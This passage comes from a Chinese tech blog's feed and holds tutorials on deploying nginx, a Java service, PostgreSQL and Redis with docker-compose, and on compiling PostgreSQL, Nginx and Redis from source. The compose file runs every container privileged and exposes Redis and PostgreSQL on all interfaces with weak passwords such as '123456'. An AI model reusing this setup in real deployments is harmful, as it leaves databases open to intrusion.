    <content type="html"><![CDATA[<h3 id="什么是docker-compose"><a href="#什么是docker-compose" class="headerlink" title="什么是docker-compose?"></a>什么是docker-compose?</h3><p>英文解释：</p><p>Docker Compose is a tool for running multi-container applications on Docker defined using the <a href="https://compose-spec.io/">Compose file format</a>. A Compose file is used to define how the one or more containers that make up your application are configured. Once you have a Compose file, you can create and start your application with a single command: <code>docker compose up</code>.</p><p>也就是说docker-compose是一个工具，通过一个定义的compose文件格式来运行docker上的多容器应用程序，Compose 文件用于定义构成应用程序的一个或多个容器的配置方式，可以通过docker-compose up来启动docker应用程序，所以说docker-compose是一个很好的docker管理docker的东西，下面讲一次docker-compose的一次使用。</p><h3 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h3><p>这里将要搭建一个常用的项目架构，使用的环境如下</p><ul><li>nginx:1.18.0</li><li>jdk:1.8</li><li>postgresql:10.4</li><li>redis:5.0.13</li></ul><p>这是一个最基础的项目情况，首先流量进入nginx，nginx做反向代理把流量转发给我们的项目（这里取名叫做fire），然后fire可以访问pgsql和redis。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h5 id="安装docker，命令如下"><a href="#安装docker，命令如下" class="headerlink" title="安装docker，命令如下"></a>安装docker，命令如下</h5><p>通过yum安装docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker</span><br></pre></td></tr></table></figure><p>使用service服务运行docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>判断docker是否启动成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br><span class="line"><span class="comment"># 出现下面信息 </span></span><br><span class="line"><span class="comment"># Docker version 1.13.1, build 7d71120/1.13.1</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">docker ps </span><br><span class="line"><span class="comment"># 出现</span></span><br><span class="line"><span class="comment"># CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span></span><br></pre></td></tr></table></figure><h5 id="安装docker-compose工具"><a href="#安装docker-compose工具" class="headerlink" title="安装docker-compose工具"></a>安装docker-compose工具</h5><p>去<a href="https://github.com/docker/compose/tags">docker-compose的github</a>上下载对应的tag，这里我们选择v2.0.1</p><p><img src="/.io//image-20211029011704887.png" alt="image-20211029011704887"></p><p>点进去选择自己对应的服务器或者电脑版本下载，这里我是linux-x86_64的。</p><p><img src="/.io//image-20211029011917528.png" alt="image-20211029011917528"></p><p>下载完之后会发现下下来的直接就可以使用，我们修改一下名字，并放入/usr/bin/目录下，这样就可以直接使用命令了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv docker-compose-linux-x86_64 docker-compose <span class="comment"># 修改名字，这里下下来的是直接可以用的，已经编译好了</span></span><br><span class="line">mv docker-compose /usr/bin/ <span class="comment"># 将docker-compose移到/usr/bin目录下</span></span><br><span class="line">docker-compose -v <span class="comment"># 测试一下，出现Docker Compose version v2.0.1即为成功</span></span><br></pre></td></tr></table></figure><h3 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a>docker-compose.yml文件编写</h3><p>文件如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span> <span class="comment">#版本</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/redis:5.0.13</span> <span class="comment"># 镜像名称，不知道可以docker search redis搜索一下，然后填入版本号可以去官方仓库查看，地址：https://hub.docker.com/search?q=java&amp;type=image</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span> <span class="comment"># 这里很重要，因为我项目是部署在非root用户下面，所以在我运行的时候一直报权限不足，加了这个就好了</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span> <span class="comment"># 容器名称</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span> <span class="comment"># 每次重启自动启动</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span> <span class="comment"># 使用上海时区</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/data/redis:/data</span> <span class="comment"># 挂载映射，冒号前面的是你服务器的路径，后面的是docker容器里面的路径，两边做了一个映射</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:6379:6379</span> <span class="comment"># 端口映射，将本机的6379端口和docker容器的6379端口做了映射，0.0.0.0表示端口对外开放，服务器外可以访问。</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">--requirepass</span> <span class="number">123456</span> <span class="comment"># 执行的命令，--requirepass 设置密码为123456</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/postgres:10.4</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_DB=sca</span> <span class="comment"># 设置pgsql的数据库名称</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_USER=sca</span> <span class="comment"># 设置pgsql的用户名，他有一个默认用户postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_PASSWORD=sca</span> <span class="comment"># 设置pgsql的密码</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:5432:5432</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/data/postgresql:/var/lib/postgresql/data</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/nginx:1.18.0</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/config/nginx/conf/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/app/html:/usr/share/nginx/html</span> <span class="comment"># 前端的静态文件存放在服务器的$&#123;HOME&#125;/app/html下，会自动映射进docker里面的/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:80:80</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fire</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fire</span> <span class="comment"># 表示依赖于fire这个项目</span></span><br><span class="line">  <span class="attr">fire:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">openjdk:8-jdk-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">fire</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:8081:8081</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/app/fire-service.jar:/app/fire-service.jar</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">java</span> <span class="string">-jar</span> <span class="string">-Dspring.profiles.active=dev</span> <span class="string">/app/fire-service.jar</span> <span class="comment"># -Dspring.profiles.active=dev指定dev环境运行</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span> <span class="comment"># 表示依赖于postgresql和redis</span></span><br></pre></td></tr></table></figure><p>这里有几个地方要说一下</p><p>第一个是privileged: true，这里是由于我是非root用户使用docker-compose的，所以他在docker容器里面使用路径的话会出现权限不够的情况，使用这个就解决了这个问题，但是有一个其他的问题就是在服务器映射创建出来的文件变成了root权限，这个还有待优化去解决。</p><p>第二个是我后面出现了一个问题，问题如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fire       | Error: Invalid or corrupt jarfile /app/fire-service.jar</span><br></pre></td></tr></table></figure><p>这个问题出现有很多种情况，比如你映射的docker容器里面的路径和你启动命令的路径不对，也就是volumns冒号后面的路径和你command里面java -jar启动的路径不对。</p><p>在这里我是一种特殊的情况，是因为我使用的是非root用户，而且我的volumes里面使用了${HOME}，所以外面被映射到了/root目录下，而不是我的/home/myName目录下，排查这个问题的心理路程如下。</p><p>首先我猜想是不是我的docker-compose.yml文件有没有错误，在我仔细万分的肉眼识别之下，我确定是没有问题的，那么排查我文件的错误。</p><p>然后我在确定我docker-compose.yml文件下的映射没问题的情况下，我想查看我容器里面的包是否正确，但是容器无法启动，我无法通过 docker exec -it 容器名 bash 命令进入我的容器，所以我得想办法进入我的容器或者输出我这个容器的映射文件，于是我构造了以下command。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>: ls -l /app &amp; java -jar -Dspring.profiles.active=dev /app/fire-service.jar <span class="comment"># 主要目的是打印出fire-service.jar文件的大小，看看是不是文件损坏或者其他原因</span></span><br></pre></td></tr></table></figure><p>结果发现了如下打印</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fire       | total 0</span><br><span class="line">fire       | drwxr-xr-x    2 root     root             6 Oct 28 22:06 fire-service.jar</span><br></pre></td></tr></table></figure><p>看见这个文件的大小只有6B，明显不对，我在仔细看我的docker-compose文件，发现了问题点，原来我是root用户启动的docker-compose up命令，导致${HOME}取了/root的值，后来su myName切换到普通用户，就成功了</p><p>最终docker ps发现项目全部启动</p><p><img src="/.io//image-20211029015838506.png" alt="image-20211029015838506"></p><p>最后说一下docker-compose的常用命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up <span class="comment"># 启动</span></span><br><span class="line">docker-compose up -d <span class="comment"># 后台启动</span></span><br><span class="line">docker-compose down <span class="comment"># 关闭</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;什么是docker-compose&quot;&gt;&lt;a href=&quot;#什么是docker-compose&quot; class=&quot;headerlink&quot; title=&quot;什么是docker-compose?&quot;&gt;&lt;/a&gt;什么是docker-compose?&lt;/h3&gt;&lt;p&gt;英文解释：&lt;/p</summary>
      
    
    
    
    <category term="docker" scheme="http://fireflyingup.github.io/categories/docker/"/>
    
    
    <category term="docker" scheme="http://fireflyingup.github.io/tags/docker/"/>
    
    <category term="docker-compose" scheme="http://fireflyingup.github.io/tags/docker-compose/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装PostgreSql</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/</id>
    <published>2021-09-23T16:44:28.000Z</published>
    <updated>2023-12-18T01:34:34.446Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、下载postgresql"><a href="#1、下载postgresql" class="headerlink" title="1、下载postgresql"></a>1、下载postgresql</h4><p>百度或者谷歌搜索postgresql download</p><p><img src="/.io//image-20210924165355347.png" alt="image-20210924165355347"></p><p>点进去就是postgresql的官方下载页面，页面如下</p><p><img src="/.io//image-20210924165711106.png" alt="image-20210924165711106"></p><p>如果你知道你自己的系统是什么，那么你就去上面蓝色框中选择自己系统对应的来进行下载，当然不知道的话，比如说你是arm的系统，这时候就要在自己的系统上使用源码编译，不然是无法使用的，这里就是要进行源码编译，所以我们选择Source code下面的file browser，也就是上图中的红色框。</p><p>点进去可以看到有很多postgresql的版本，这里我们选择10.4版本进行安装。</p><p><img src="/.io//image-20210924170316426.png" alt="image-20210924170316426"></p><p>点击v10.4进去下载对应的压缩文件</p><p><img src="/.io//image-20210924170447245.png" alt="image-20210924170447245"></p><p>当然也可以使用wget命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.postgresql.org/pub/<span class="built_in">source</span>/v10.4/postgresql-10.4.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf postgresql-10.4.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><h4 id="2、编译安装postgresql"><a href="#2、编译安装postgresql" class="headerlink" title="2、编译安装postgresql"></a>2、编译安装postgresql</h4><p>在编译之前我们要先对编译所需要的环境进行安装</p><p>安装readline</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install readline-devel <span class="comment">#yum安装</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sudo apt-get install libreadline6-dev</span><br></pre></td></tr></table></figure><p>不安装可能会出现如下错误</p><p><img src="/.io//image-20210924173402260.png" alt="image-20210924173402260"></p><p>安装zlib</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zlib-devel</span><br></pre></td></tr></table></figure><p>进入解压好的文件夹里面执行编译命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> postgresql-10.4</span><br><span class="line">./configure --prefix=/root/target/postgre <span class="comment">#指定编译目标文件夹</span></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="3、安装完成"><a href="#3、安装完成" class="headerlink" title="3、安装完成"></a>3、安装完成</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@QLL3-5 postgre]<span class="comment"># ls</span></span><br><span class="line">bin  include  lib  share</span><br><span class="line">[root@QLL3-5 postgre]<span class="comment"># pwd</span></span><br><span class="line">/root/target/postgre</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、下载postgresql&quot;&gt;&lt;a href=&quot;#1、下载postgresql&quot; class=&quot;headerlink&quot; title=&quot;1、下载postgresql&quot;&gt;&lt;/a&gt;1、下载postgresql&lt;/h4&gt;&lt;p&gt;百度或者谷歌搜索postgresql dow</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="linux" scheme="http://fireflyingup.github.io/tags/linux/"/>
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
    <category term="postgresql" scheme="http://fireflyingup.github.io/tags/postgresql/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装Nginx</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/</id>
    <published>2021-09-23T16:44:20.000Z</published>
    <updated>2023-12-18T01:34:41.131Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、nginx下载"><a href="#1、nginx下载" class="headerlink" title="1、nginx下载"></a>1、nginx下载</h4><p>整个安装步骤可以直接采用官方的<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">安装文档</a></p><p>使用wget命令下载nginx，这里以nginx 1.18.0 版本为例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://nginx.org/download/nginx-1.18.0.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf nginx-1.18.0.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>或者去<a href="http://nginx.org/en/download.html">nginx官网下载页面</a>下载安装包，页面如下</p><p><img src="/.io//image-20210924103858604.png" alt="image-20210924103858604"></p><h4 id="2、必要模块安装"><a href="#2、必要模块安装" class="headerlink" title="2、必要模块安装"></a>2、必要模块安装</h4><p>下载PCRE，PCRE - Supports regular expressions. Required by the NGINX <a href="https://nginx.org/en/docs/ngx_core_module.html">Core</a> and <a href="https://nginx.org/en/docs/http/ngx_http_rewrite_module.html">Rewrite</a> modules.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf pcre-8.44.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>下载zlib, zlib - Supports header compression. Required by the NGINX <a href="https://nginx.org/en/docs/http/ngx_http_gzip_module.html">Gzip</a> module.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://zlib.net/zlib-1.2.11.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf zlib-1.2.11.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>可以看到当前文件夹下面有以下文件</p><p><img src="/.io//image-20210924125124462.png" alt="image-20210924125124462"></p><p>接下来我们依次进行编译</p><p>编译pcre-8.44</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pcre-8.44</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>发现以下报错</p><p><img src="/.io//image-20210924125702614.png" alt="image-20210924125702614"></p><p>原因是没有gcc-c++编译环境，输入以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line"><span class="comment">#完成安装之后继续编译pcre</span></span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>出现如下页面表示成功</p><p><img src="/.io//image-20210924130228697.png" alt="image-20210924130228697"></p><p>接下来执行以下命令，即pcre编译完成。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install </span><br></pre></td></tr></table></figure><p>编译zlib，执行过程和pcre一致，在这里不再重复。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> zlib-1.2.11</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="3、编译安装nginx"><a href="#3、编译安装nginx" class="headerlink" title="3、编译安装nginx"></a>3、编译安装nginx</h4><p>进入nginx目录，这里我选择将nginx编译后放入/root/target/nginx目录下面，这个目录你们可以自行配置，参数介绍官方的<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">安装文档</a>有很详细的介绍，这里我不在介绍。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.18.0</span><br><span class="line">./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module</span><br></pre></td></tr></table></figure><p>在运行上述命令的时候我发现了另一个问题，这个是没有OpenSSL的环境。</p><p><img src="/.io//image-20210924131144777.png" alt="image-20210924131144777"></p><p>我们执行以下命令来安装OpenSSL的环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openssl openssl-devel</span><br></pre></td></tr></table></figure><p>然后在继续执行就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>这样nginx的源码编译安装就大功告成了，附上一个nginx编译完成的截图。</p><p><img src="/.io//image-20210924131612064.png" alt="image-20210924131612064"></p><p>再附上一个安装到目标文件夹的截图。</p><p><img src="/.io//image-20210924131713603.png" alt="image-20210924131713603"></p><p>最后说一句，刚开始我准备使用nginx-1.9.15，可是后来在使用./configure的时候遇见了各种问题，后来就按照官方文档使用了稳定的nginx-1.18.0。</p><p>参考链接：</p><p>nginx官方文档：<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources</a></p><p>安装OpenSSL：<a href="https://blog.csdn.net/testcs_dn/article/details/51461999">https://blog.csdn.net/testcs_dn/article/details/51461999</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、nginx下载&quot;&gt;&lt;a href=&quot;#1、nginx下载&quot; class=&quot;headerlink&quot; title=&quot;1、nginx下载&quot;&gt;&lt;/a&gt;1、nginx下载&lt;/h4&gt;&lt;p&gt;整个安装步骤可以直接采用官方的&lt;a href=&quot;https://docs.nginx</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="nginx" scheme="http://fireflyingup.github.io/tags/nginx/"/>
    
    <category term="linux" scheme="http://fireflyingup.github.io/tags/linux/"/>
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装Redis</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Redis/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Redis/</id>
    <published>2021-09-23T16:44:05.000Z</published>
    <updated>2023-12-18T01:34:28.911Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、下载Redis"><a href="#1、下载Redis" class="headerlink" title="1、下载Redis"></a>1、下载Redis</h4><p>redis版本：5.0.13</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.13.tar.gz <span class="comment">#下载redis</span></span><br><span class="line">tar -zxvf redis-5.0.13.tar.gz <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> redis-5.0.13</span><br></pre></td></tr></table></figure><h4 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h4><p>可以直接使用make &amp;&amp; make install，如果想要编译到指定文件夹的话，使用以下命令，注意一定要连在一起而且不能用&amp;&amp;，不然将不会编译到指定文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make CFLAGS=<span class="string">&quot;-g -O0&quot;</span> PREFIX=/root/target/redis install</span><br></pre></td></tr></table></figure><p>如果缺少gcc-c++环境的话，使用以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure><h4 id="3、编译完成"><a href="#3、编译完成" class="headerlink" title="3、编译完成"></a>3、编译完成</h4><p>可以看到最后在指定文件夹下面出现了bin文件夹，编译完成。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@QLL3-5 bin]<span class="comment"># pwd</span></span><br><span class="line">/root/target/redis/bin</span><br><span class="line">[root@QLL3-5 bin]<span class="comment"># ls</span></span><br><span class="line">redis-benchmark  redis-check-aof  redis-check-rdb  redis-cli  redis-sentinel  redis-server</span><br><span class="line">[root@QLL3-5 bin]<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、下载Redis&quot;&gt;&lt;a href=&quot;#1、下载Redis&quot; class=&quot;headerlink&quot; title=&quot;1、下载Redis&quot;&gt;&lt;/a&gt;1、下载Redis&lt;/h4&gt;&lt;p&gt;redis版本：5.0.13&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="linux" scheme="http://fireflyingup.github.io/tags/linux/"/>
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
    <category term="redis" scheme="http://fireflyingup.github.io/tags/redis/"/>
    
  </entry>
  
</feed>
